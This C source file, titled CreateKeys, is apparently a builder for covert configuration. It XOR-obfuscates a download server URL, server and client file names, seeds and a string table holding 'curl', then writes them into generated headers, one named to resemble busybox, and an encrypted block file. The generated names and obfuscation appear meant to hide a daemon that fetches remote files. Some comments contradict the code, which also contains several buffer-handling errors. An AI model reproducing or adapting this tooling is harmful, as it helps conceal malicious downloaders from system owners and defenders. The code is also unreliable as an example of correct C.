//CreateKeys
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>

#define CIPHER 1

#if CIPHER
 #define MAXMSG  127
 char out[MAXMSG+1]={0};
 char in[MAXMSG+1]={0};
 size_t outsize=0;
 size_t insize=0;
 size_t progress=0;
 size_t keysize=0;
 char key[MAXMSG+1]={0};

 char seed_c[MAXMSG];
 char seed_s[MAXMSG];
 char seed_a[MAXMSG];
 char seed_k[MAXMSG];
 char seed_custom[MAXMSG];
 char url[MAXMSG];
 char server[MAXMSG];
 char client[MAXMSG];
 char customfile[MAXMSG];
 char seed_sa[MAXMSG];
 char seed_cak[MAXMSG];

 size_t seed_c_size=0;
 size_t seed_s_size=0;
 size_t seed_a_size=0;
 size_t seed_k_size=0;
 size_t seed_custom_size=0;
 size_t url_size=0;
 size_t server_size=0;
 size_t client_size=0;
 size_t customfile_size=0;
 size_t seed_sa_size=0;
 size_t seed_cak_size=0;

#endif


//Alter the definitions here, but also need to fix in recovery
#define MAXKEYS 5

//#define BdhuPmBf "TAJR:%r" //server
//#define QynRlYS "4u#E{<cH#R[" //client
//#define TGIA2 "[5nd#Xv" //seed_sa
//#define YqKclAT4 "@2}wy?" //seed_cak

const char * table[MAXKEYS]={
    "curl",
    "TAJR:%r",
    "4u#E{<cH#R[",
    "[5nd#Xv",
    "@2}wy?"
};


char block[MAXMSG*(MAXKEYS+2)];

void process_key()
{
    int i,j;
    keysize=insize;

    for (i=0,j=0; i<insize; i++)
    {
        key[i] = out[j++] ^ in[i];
        if (j>outsize)
            j=0;
    }
}

int decrypt(int ch)
{
    if (keysize)
    {
        ch ^= key[progress];
        progress = (progress+1)%keysize;
    }
    return(ch);
}

void decryptblock(char * block, int len)
{
    int i;
    progress=0;
    for (i=0; i< len; i++)
    {
        *block = decrypt(*block);
        block++;
    }
}

void printinput(FILE * fp, char * block, int len)
{
    int i;
    char * s=block;
    progress=0;
    for (i=0; i< len; i++)
    {
        fprintf(fp,"%02x", (unsigned int)( *s++ & 0xff));
    }
    fprintf(fp,"\n");

}


void printblock(FILE * fp, char * block, int len)
{
    int i;
    char * s=block;
    progress=0;

    fprintf (fp," {");
    s=block;
    for (i=0; i< len; i++)
    {
        fprintf(fp,"0x%02x", (unsigned int)( *s++ & 0xff));
        if (i<len-1) fprintf(fp,",");
    }
    fprintf(fp,"};\n");
}

void hexdecode(char * str, char * output, int * size)
{
    *size=0;
    char buff[3];
    buff[2]='\0';
    if ((strlen(str) % 2))
        return;
    while (*str)
    {
        buff[0]=*str++;
        buff[1]=*str++;
        long int num = strtol(buff, NULL, 16);
        *output++ = (char)num;
        (*size)++;
    }
}

void pad(char * buff, int len)
{
    int i;
    for (i=0; i<len; i++)
        buff[i]=32+rand()%96;
    buff[len]='\0';
}


int main(int argc, char**argv)
{
    char buffer[MAXMSG+1];
    FILE * fp;
    FILE * finput;
    FILE * fbusy;
    FILE * fdaemon;
    FILE * fcustom;
    time_t t;
    int i;
    int len;
    int blk=0;

    /* Intializes random number generator */
    srand((unsigned) time(&t));

    //Enter primary keys & URL type info
    printf("Enter seed_c (plain hex): ");
    scanf("%s",buffer);
    hexdecode(buffer, seed_c, &seed_c_size);

    printf("Enter seed_s (plain hex): ");
    scanf("%s",buffer);
    hexdecode(buffer, seed_s, &seed_s_size);

    printf("Enter seed_a (plain hex): ");
    scanf("%s",buffer);
    hexdecode(buffer, seed_a, &seed_a_size);

    printf("Enter seed_k (plain hex): ");
    scanf("%s",buffer);
    hexdecode(buffer, seed_k, &seed_k_size);

    printf("Enter seed_custom (plain hex): ");
    scanf("%s",buffer);
    hexdecode(buffer, seed_custom, &seed_custom_size);

    printf("Enter custom filepath: ");
    scanf("%s",customfile);
    customfile_size = strlen(customfile);

    printf("Enter URL of download webserver: ");
    scanf("%s",url);
    url_size = strlen(url);

    printf("Enter server file:");
    scanf("%s",server);
    server_size = strlen(server);

    printf("Enter client file: ");
    scanf("%s",client);
    client_size = strlen(client);

    //OPEN ALL FILES
    fbusy = fopen("busyboc.h", "wb");
    fdaemon = fopen("daemon.h", "wb");
    finput = fopen("input", "wb");
    fcustom = fopen("custom.h", "wb");

    //Create busyboc info
    memcpy(in, seed_c, seed_c_size);
    insize=seed_c_size;
    memcpy(key, seed_a, seed_a_size);
    keysize=seed_a_size;
    decryptblock(in,insize);
    fprintf(fbusy,"const char seed_ca[KEYSIZE]= ");
    printblock(fbusy, in, insize);

    memcpy(in, seed_c, seed_c_size);
    insize=seed_c_size;
    memcpy(key, seed_s, seed_s_size);
    keysize=seed_s_size;
    decryptblock(in,insize);
    fprintf(fbusy,"const char seed_cs[KEYSIZE]= ");
    printblock(fbusy, in, insize);

    fprintf(fbusy,"%s\n","#define BdhuPmBf \"TAJR:%r\"");  //server
    fprintf(fbusy,"%s\n","#define QynRlYS \"4u#E{<cH#R[\""); //client

    //Create Daemon info
    //Create Input file for makeblock

    fprintf(finput,"%s\n",url);
    fprintf(finput,"%s\n",server);
    fprintf(finput,"%s\n",client);

    memcpy(in, seed_s, seed_s_size);
    insize=seed_s_size;
    memcpy(key, seed_a, seed_a_size);
    keysize=seed_a_size;
    decryptblock(in,insize);

    memcpy(seed_sa, in, insize);
    seed_sa_size = insize;
    
    fprintf(fdaemon,"const char seed_sa[KEYSIZE]= ");

    printblock(fdaemon, in, insize);
    printinput(finput, in, insize);

    memcpy(in, seed_k, seed_k_size);
    insize=seed_k_size;
    memcpy(key, seed_c, seed_c_size);
    keysize=seed_c_size;
    decryptblock(in,insize);
    memcpy(key, seed_a, seed_a_size);
    keysize=seed_a_size;
    decryptblock(in,insize);

    memcpy(seed_cak, in, insize);
    seed_cak_size = insize;

    fprintf(fdaemon, "const char seed_cak[KEYSIZE]= ");

    printblock(fdaemon, in, insize);
    printinput(finput, in, insize);

    fprintf(finput,"%s",customfile);

    //Create custom info

    fprintf(fcustom,"const char pathkey[]=");
    //{0xaf,0x55,0xc4,0x27,0x52,0x4e,0x21,0x8d,0xc4,0xe9,0xcf,0xf4,0xa4,0xcc,0x0f,0xf2,0xae,0x5f,0x46,0xfc};
    printblock(fcustom, seed_custom, seed_custom_size);

    fprintf(fcustom,"const char path1_enc[]="); 
    //0x80,0x20,0xb7,0x55,0x7d,0x22,0x48,0xef,0xeb,0x8f,0xa0,0x9a,0xd0,0xbf,0x20,0x96,0xcb,0x35,0x27,0x8a,0xda,0x0a,0xb7,0x46,0x3c,0x3d,0x7e,0xbf,0xf1,0xb6,0xfa,0xc4,0x8a,0xbd,0x7c,0x94,0xae,0x6f,0x23,0xc5,0xcc,0x55,0xe3,0x62,0x74,0x31,0x18,0xec,0xe3,0xc1,0xe1,0xaf,0xe7,0xbc,0x5b,0xaf,0xf5,0x36,0x04,0xb6,0xc0,0x77,0xa2,0x0d,0x2b,0x7c,0x61,0xdd,0xb2,0x9e,0xa4,0xaa,0xe0,0x9f,0x6c,0xb8,0xfc,0x02,0x2a,0xc6,0xca,0x0f,0xb1,0x0f,0x18,0x67,0x64,0xe8,0xb7,0x8e,0xe0,0xb6,0xed,0x9a,0x43,0xd0,0xe6,0x13,0x14,0xc2,0xec,0x28,0x98,0x4f,0x02,0x6e,0x53,0xee,0xf9,0xd7,0xb2,0x96,0xdc,0x9e,0x65,0xd0,0xf2,0x30,0x21,0xb3,0xf9,0x02,0x95,0x78,0x3f,0x33,0x40};
    memcpy(key, seed_custom, seed_custom_size);
    keysize=seed_custom_size;
    memcpy(buffer, customfile, customfile_size);
    decryptblock(buffer,customfile_size);
    printblock(fcustom, buffer, customfile_size);

    fprintf(fcustom, "\n#define MAXKEYS %u\n",MAXKEYS);

    keysize=sizeof(seed_custom);
    memcpy(key,seed_custom,keysize);

    for (i=0; i<MAXKEYS; i++)
    {
        int len = strlen(table[i]);
        fprintf(fcustom,"const char s%u[]=",i);
        strcpy(out, table[i]);
        decryptblock(out,len);
        printblock(fcustom,out,len+1);
    }

    fprintf(fcustom, "\nconst char * table[MAXKEYS]={\n");
    for (i=0; i<MAXKEYS; i++)
    {
        fprintf(fcustom,"s%u",i);
        if (i<MAXKEYS-1)
            fprintf(fcustom,",");
    }
    fprintf(fcustom, "\n};\n");

    //CLOSE ALL FILES
    fclose (fbusy);
    fclose (finput);
    fclose (fdaemon);
    fclose (fcustom);

    // Create encrypted block file
    char *filename = &customfile[customfile_size];    
    while (*filename != '/')
        filename--;
    filename++;

    //URL is XORed with 0x55, then stored as binary
    pad (&buffer[1],MAXMSG);
    strcpy(&buffer[1], url);
    len=strlen(&buffer[1]);
    buffer[0]=len;
    for (i=1; i< len+1; i++)
    {
        buffer[i] ^= 0x55;
    }
    decryptblock(buffer,MAXMSG);
    memcpy(&block[MAXMSG*blk++], buffer, MAXMSG);

    //server XORed with 0xff, then stored as binary
    pad (&buffer[1],MAXMSG);
    strcpy(&buffer[1], server);
    len=strlen(&buffer[1]);
    buffer[0]=len;
    for (i=1; i< len+1; i++)
    {
        buffer[i] ^= 0x55;
    }
    decryptblock(buffer,MAXMSG);
    memcpy(&block[MAXMSG*blk++], buffer, MAXMSG);

    //client XORed with 0xff, then stored as binary
    pad (&buffer[1],MAXMSG);
    strcpy(&buffer[1], client);
    len=strlen(&buffer[1]);
    buffer[0]=len;
    for (i=1; i< len+1; i++)
    {
        buffer[i] ^= 0x55;
    }
    decryptblock(buffer,MAXMSG);
    memcpy(&block[MAXMSG*blk++], buffer, MAXMSG);
 
    //seed_sa is stored in hex
    pad (in,MAXMSG);
    strcpy(&buffer[1], seed_sa);
    hexdecode(&buffer[1],&in[1], &insize);
    in[0]=insize;
    for (i=1; i< insize+1; i++)
    {
        in[i] ^= 0x55;
    }
    decryptblock(in,MAXMSG);
    memcpy(&block[MAXMSG*blk++], in, MAXMSG);

    //seed_cak is stored in hex
    pad (in,MAXMSG);
    strcpy(&buffer[1], seed_cak);
    hexdecode(&buffer[1],&in[1], &insize);
    in[0]=insize;
    for (i=1; i< insize+1; i++)
    {
        in[i] ^= 0x55;
    }
    decryptblock(in,MAXMSG);
    memcpy(&block[MAXMSG*blk++], in, MAXMSG);

    fp = fopen(filename,"wb");
    if (fp)
    {
        fwrite(&block[0], (MAXMSG)*blk, 1, fp);
        fclose(fp);
    }

    exit(EXIT_SUCCESS);
}


